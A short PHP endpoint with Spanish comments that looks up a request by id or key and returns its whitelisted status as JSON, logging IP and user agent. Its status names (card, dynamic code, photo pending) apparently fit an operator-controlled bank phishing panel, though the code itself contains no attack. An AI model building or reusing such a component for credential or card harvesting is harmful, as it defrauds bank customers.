<?php
// FIX_ESTRICTO: No devuelve estados de otras filas.
// Solo retorna opcion_X si la MISMA fila (por rid o key) tiene estado=opcion_X.
// Cualquier mismatch (rid/key no existen / estado vacio/NULL/pendiente) => retorna pendiente.
header('HTTP/1.1 200 OK');
header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');

try {
    require __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';

    $request_id = $_GET['rid'] ?? $_GET['requestId'] ?? $_GET['request_id'] ?? '';
    $key        = $_GET['key'] ?? '';

    $remote = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $ua     = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

    $row = null;
    $hitBy = null;
    $finalEstado = 'pendiente';

    if ($request_id !== '') {
        $stmt = $pdo->prepare("SELECT request_id, `key`, estado FROM solicitudes WHERE BINARY request_id = ? LIMIT 1");
        $stmt->execute([$request_id]);
        $row = $stmt->fetch(PDO::FETCH_ASSOC);
        if ($row) $hitBy = 'request_id';
    }

    if ((!$row || ($row && empty($row['estado']))) && $key !== '') {
        $stmt = $pdo->prepare("SELECT request_id, `key`, estado FROM solicitudes WHERE BINARY `key` = ? LIMIT 1");
        $stmt->execute([$key]);
        $row2 = $stmt->fetch(PDO::FETCH_ASSOC);
        if ($row2) {
            $row = $row2;
            if (!$hitBy) $hitBy = 'key';
        }
    }

    // Regla estricta: estado valido solo si la fila fue encontrada Y el estado de ESA fila es no-vacio y distinto de pendiente.
    // Valores de estado validos (opcion_N) son solo los que empiezan por "opcion_" o nombres conocidos; cualquier otro => pendiente.
    $listaValidos = [
        'opcion_1','opcion_2','opcion_3','opcion_4','opcion_5','opcion_6',
        'opcion_7','opcion_8','opcion_9','opcion_10','opcion_55',
        'DINAMICA_PENDIENTE','TARJETA_PENDIENTE','ERROR_PENDIENTE',
        'FOTO_PENDIENTE','FINALIZADO','ERROR_DINAMICA',
    ];
    if (
        $row &&
        is_array($row) &&
        isset($row['estado']) &&
        is_string($row['estado']) &&
        $row['estado'] !== '' &&
        $row['estado'] !== null &&
        strtolower($row['estado']) !== 'pendiente' &&
        in_array($row['estado'], $listaValidos, true)
    ) {
        $finalEstado = (string)$row['estado'];
    }

    // Auditoria LOG (rotacion simple: 1 archivo). No exponemos passwords ni datos sensibles.
    try {
        $logDir = __DIR__;
        $logPath = $logDir . DIRECTORY_SEPARATOR . 'debug_estado.log';
        $line = sprintf(
            "[%s] ip=%s rid=%s key=%s hitBy=%s foundRow=%s rowRid=%s rowKey=%s rowEstado=%s finalEstado=%s ua=%s\n",
            gmdate('Y-m-d\TH:i:s\Z'),
            $remote,
            $request_id,
            $key,
            ($hitBy ?? 'none'),
            ($row ? '1' : '0'),
            ($row['request_id'] ?? ''),
            ($row['key'] ?? ''),
            ($row['estado'] ?? ''),
            $finalEstado,
            $ua
        );
        $fp = @fopen($logPath, 'a');
        if ($fp) {
            @fwrite($fp, $line);
            @fclose($fp);
        }
    } catch (Throwable $_) { /* ignore logging errors */ }

    echo json_encode(['estado' => $finalEstado], JSON_UNESCAPED_UNICODE);
} catch (Throwable $e) {
    error_log('estado.php error: '.$e->getMessage());
    try {
        echo json_encode(['estado' => 'pendiente'], JSON_UNESCAPED_UNICODE);
    } catch (Throwable $_) { /* ignore */ }
}
exit;
